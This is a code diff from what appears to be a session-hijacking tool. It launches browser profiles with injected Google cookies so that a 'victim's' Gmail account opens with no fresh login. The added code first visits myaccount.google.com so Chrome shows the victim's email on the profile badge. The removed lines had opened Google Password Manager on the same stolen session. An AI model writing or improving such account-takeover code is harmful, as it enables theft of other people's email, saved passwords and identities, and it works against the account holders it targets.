@@ -102,28 +102,33 @@ async function launchProfile({ profileId, cookies, email, userId }) {
     console.warn(`[FIONA] No cookies received for ${email}`);
   }
 
+  // Use the default page launchPersistentContext creates
   const pages = context.pages();
-  const gmailTab = pages.length > 0 ? pages[0] : await context.newPage();
+  const firstTab = pages.length > 0 ? pages[0] : await context.newPage();
 
-  // Tab 1 — Gmail inbox
+  // Visit myaccount.google.com FIRST — this triggers Chrome's internal
+  // accounts.google.com/ListAccounts?gpsia=1 check using the injected
+  // LSID/GAPS cookies, which is what makes the profile badge show the
+  // victim's email rather than showing "Sign in to Chrome"
+  await firstTab.goto('https://myaccount.google.com', {
+    waitUntil: 'domcontentloaded',
+    timeout: 30000,
+  });
+  await firstTab.waitForTimeout(2000);
+
+  // Now open Gmail in a new tab (tab 2 becomes the focus)
+  const gmailTab = await context.newPage();
   await gmailTab.goto('https://mail.google.com', {
     waitUntil: 'domcontentloaded',
     timeout: 30000,
   });
 
-  // Tab 2 — Google Password Manager via injected GAIA cookies
-  // No new-device login triggered — same session as Gmail
-  const pwTab = await context.newPage();
-  await pwTab.goto('https://passwords.google.com', {
-    waitUntil: 'domcontentloaded',
-    timeout: 30000,
-  });
-
+  // Bring Gmail tab to front
   await gmailTab.bringToFront();
-  await gmailTab.waitForTimeout(2000);
+  await gmailTab.waitForTimeout(3000);
 
-  const finalUrl  = gmailTab.url();
-  const pageTitle = await gmailTab.title();
+  const finalUrl   = gmailTab.url();
+  const pageTitle  = await gmailTab.title();
   console.log(`[FIONA] Gmail URL:   ${finalUrl}`);
   console.log(`[FIONA] Gmail title: ${pageTitle}`);
 
